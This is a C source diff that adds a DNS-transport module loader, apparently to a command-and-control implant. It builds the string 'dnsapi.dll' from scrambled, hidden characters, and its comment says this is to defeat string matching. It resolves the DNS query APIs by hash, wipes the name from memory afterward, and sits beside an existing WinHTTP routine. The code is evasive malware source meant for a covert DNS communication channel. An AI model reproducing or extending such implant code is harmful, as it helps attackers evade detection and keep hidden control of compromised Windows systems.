@@ -503,3 +503,39 @@ BOOL RtWinHttp(
     return TRUE;
 }
 #endif
+
+#ifdef TRANSPORT_DNS
+BOOL RtDnsApi( VOID )
+{
+    /* "dnsapi.dll" — indices scrambled to prevent trivial string matching */
+    CHAR ModuleName[ 11 ] = { 0 };
+
+    ModuleName[ 0  ] = HideChar( 'd' );
+    ModuleName[ 3  ] = HideChar( 'a' );
+    ModuleName[ 7  ] = HideChar( 'd' );
+    ModuleName[ 1  ] = HideChar( 'n' );
+    ModuleName[ 4  ] = HideChar( 'p' );
+    ModuleName[ 8  ] = HideChar( 'l' );
+    ModuleName[ 2  ] = HideChar( 's' );
+    ModuleName[ 5  ] = HideChar( 'i' );
+    ModuleName[ 9  ] = HideChar( 'l' );
+    ModuleName[ 6  ] = HideChar( '.' );
+    ModuleName[ 10 ] = HideChar( '\0' );
+
+    if ( ( Instance->Modules.DnsApi = LdrModuleLoad( ModuleName ) ) )
+    {
+        MemZero( ModuleName, sizeof( ModuleName ) );
+        Instance->Win32.DnsQuery_W       = LdrFunctionAddr( Instance->Modules.DnsApi, H_FUNC_DNSQUERY_W );
+        Instance->Win32.DnsRecordListFree = LdrFunctionAddr( Instance->Modules.DnsApi, H_FUNC_DNSRECORDLISTFREE );
+        PUTS( "Loaded DnsApi functions" )
+    }
+    else
+    {
+        MemZero( ModuleName, sizeof( ModuleName ) );
+        PUTS( "Failed to load DnsApi" )
+        return FALSE;
+    }
+
+    return TRUE;
+}
+#endif
